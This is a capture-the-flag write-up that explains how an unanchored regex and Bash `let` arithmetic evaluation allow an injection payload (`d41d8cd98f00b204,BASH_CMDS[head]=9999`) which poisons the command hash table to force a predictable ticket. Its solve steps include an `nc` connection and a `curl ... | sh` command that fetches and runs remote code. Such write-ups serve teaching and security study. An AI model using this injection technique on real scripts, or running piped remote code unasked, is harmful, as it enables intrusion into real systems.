# Lottery — Write-up (121 solves)

## What this challenge is “hiding”
The prompt makes it sound like you must guess a *random* winning ticket. The script generates 16 hex characters from `/dev/urandom`, so brute forcing is effectively impossible.

The real challenge is to notice that:
1) your input is only *partially* validated as hex, and
2) the script then evaluates your input with Bash arithmetic (`let`), which allows extra operators and assignments.

That combination lets you change the behavior of later commands and make the “random” ticket predictable.

## Given script (core logic)
`lottery.sh`:
```bash
echo "Guess the winning ticket (hex):"
read guess

if [[ "$guess" =~ ^[0-9a-fA-F]+ ]]; then
    let "g = 0x$guess" 2>/dev/null
else
    echo "Invalid guess."
    exit 1
fi

ticket=$(head -c 16 /dev/urandom | md5sum | cut -c1-16)
let "t = 0x$ticket" 2>/dev/null

if [[ $g -eq $t ]]; then
    cat /flag.txt
else
    echo "Not a winner. Better luck next time!"
fi
```

## Bug #1: the regex only checks the *start* of your input
This line:
```bash
[[ "$guess" =~ ^[0-9a-fA-F]+ ]]
```
only requires that the input *begins* with hex characters. It does **not** require the whole line to be hex because it’s missing an end-of-string anchor (`$`).

So all of these pass the check:
- `deadbeef`
- `deadbeefTHIS_IS_NOT_HEX`
- `deadbeef,anything`

## Bug #2: `let` evaluates an *expression*, not “just a number”
This line is the key:
```bash
let "g = 0x$guess"
```
`let` runs Bash arithmetic evaluation. That means your “number” can actually be a full arithmetic expression, including the comma operator and assignments.

Example idea:
- If `guess` is `10,x=5`, then `let "g = 0x$guess"` becomes `let "g = 0x10,x=5"` which sets **both** `g` and `x`.

## Exploit goal: make the ticket deterministic
The ticket is generated by:
```bash
head -c 16 /dev/urandom | md5sum | cut -c1-16
```
If we can make `head` produce **no output**, then `md5sum` hashes an empty stream.

MD5 of empty input is a well-known constant:
```
d41d8cd98f00b204e9800998ecf8427e
```
The script takes only the first 16 hex characters, so the ticket becomes:
```
d41d8cd98f00b204
```

## How we break `head`: Bash’s command hash table (`BASH_CMDS`)
Bash caches command paths in an internal hash table, exposed via an associative array called `BASH_CMDS`.

If we set:
```
BASH_CMDS[head]=9999
```
then when the script later runs `head`, Bash will try to execute the cached path `9999` (which doesn’t exist), so `head` fails and outputs nothing.

Importantly, the script does **not** use `set -e` or `pipefail`, so it keeps going even though `head` failed.

## Final payload
We want:
1) our guess value to equal `d41d8cd98f00b204`, and
2) to poison `head` via `BASH_CMDS`.

Send this as your “hex guess”:
```
d41d8cd98f00b204,BASH_CMDS[head]=9999
```

What happens:
- The regex passes because the input starts with hex.
- `let` evaluates `g = 0xd41d8cd98f00b204` and also sets `BASH_CMDS[head]=9999`.
- `head` later fails → `md5sum` hashes empty input → ticket becomes `d41d8cd98f00b204`.
- `g == t` → you win → it prints the flag.

You may see an error like `... 9999: No such file or directory` — that’s expected and indicates the exploit worked.

## Step-by-step solve (remote)
1) Connect:
```sh
nc 35.245.30.212 5000
```

2) Solve the proof-of-work (PoW):
The server prints something like:
```sh
curl -sSfL https://pwn.red/pow | sh -s s.AAA....BBB...
```
Run that exact command locally; it outputs a string starting with `s.`.

3) Paste the PoW output back into the `solution:` prompt.

4) When you see `Guess the winning ticket (hex):`, paste the payload:
```text
d41d8cd98f00b204,BASH_CMDS[head]=9999
```

5) The service prints the flag.

## Flag
`uoftctf{you_won_the_LETtery_(hahahaha_get_it???)}`

